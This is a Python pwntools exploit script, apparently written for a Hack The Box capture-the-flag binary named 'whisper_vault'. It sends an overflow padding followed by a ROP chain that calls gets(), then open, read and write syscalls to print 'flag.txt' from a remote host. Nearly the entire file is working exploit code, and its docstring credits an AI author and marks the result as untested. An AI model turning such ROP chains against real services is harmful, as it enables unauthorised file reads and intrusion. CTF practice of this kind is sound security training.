#!/usr/bin/env python3
"""
Corrected exploit with proper syscall; ret gadget
Author: Claude
Updated: 2025-11-20
Purpose: Use correct syscall address (0x41abf6) instead of wrong one (0x401d44)
Approach: gets() to read "flag.txt", then open/read/write
Expected: Should get the flag
Result: TBD
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# CORRECTED Gadgets
pop_rdi = 0x401f8f
pop_rsi = 0x409ffe
pop_rdx_rbx = 0x485e6b
pop_rax = 0x450107
syscall_addr = 0x41abf6  # CORRECTED! syscall; ret (not syscall; jmp)
gets_addr = 0x4121e0
bss_addr = 0x4c72a0

def exploit(target='remote'):
    if target == 'local':
        p = process('./whisper_vault')
    else:
        p = remote('154.57.164.75', 32613)

    p.recvuntil(b'> ')

    padding = 0x400 + 8
    rop = b''

    # 1. gets(bss_addr) - read "flag.txt"
    rop += p64(pop_rdi)
    rop += p64(bss_addr)
    rop += p64(gets_addr)

    # 2. open(bss_addr, 0, 0)
    rop += p64(pop_rax)
    rop += p64(2)  # sys_open
    rop += p64(pop_rdi)
    rop += p64(bss_addr)
    rop += p64(pop_rsi)
    rop += p64(0)  # O_RDONLY
    rop += p64(pop_rdx_rbx)
    rop += p64(0) + p64(0)
    rop += p64(syscall_addr)

    # 3. read(3, bss+0x100, 0x100)
    rop += p64(pop_rax)
    rop += p64(0)  # sys_read
    rop += p64(pop_rdi)
    rop += p64(3)  # assume fd=3
    rop += p64(pop_rsi)
    rop += p64(bss_addr + 0x100)
    rop += p64(pop_rdx_rbx)
    rop += p64(0x100) + p64(0)
    rop += p64(syscall_addr)

    # 4. write(1, bss+0x100, 0x100)
    rop += p64(pop_rax)
    rop += p64(1)  # sys_write
    rop += p64(pop_rdi)
    rop += p64(1)  # stdout
    rop += p64(pop_rsi)
    rop += p64(bss_addr + 0x100)
    rop += p64(pop_rdx_rbx)
    rop += p64(0x100) + p64(0)
    rop += p64(syscall_addr)

    payload = b'A' * padding + rop + b'\n'

    log.info(f"Sending payload ({len(payload)} bytes)")
    p.send(payload)

    # Send "flag.txt" for gets()
    log.info("Sending 'flag.txt' to gets()")
    p.send(b'flag.txt\n')

    # Receive output
    try:
        data = p.recvall(timeout=3)
        log.info(f"Received {len(data)} bytes")

        if b'HTB{' in data:
            flag_start = data.find(b'HTB{')
            flag_end = data.find(b'}', flag_start) + 1
            flag = data[flag_start:flag_end].decode()
            log.success(f"ðŸš© FLAG: {flag}")
            return flag
        else:
            log.warning("No flag found")
            log.info(f"Last 200 bytes: {repr(data[-200:])}")
    except Exception as e:
        log.error(f"Error: {e}")

    p.close()

if __name__ == '__main__':
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else 'remote'
    exploit(target)
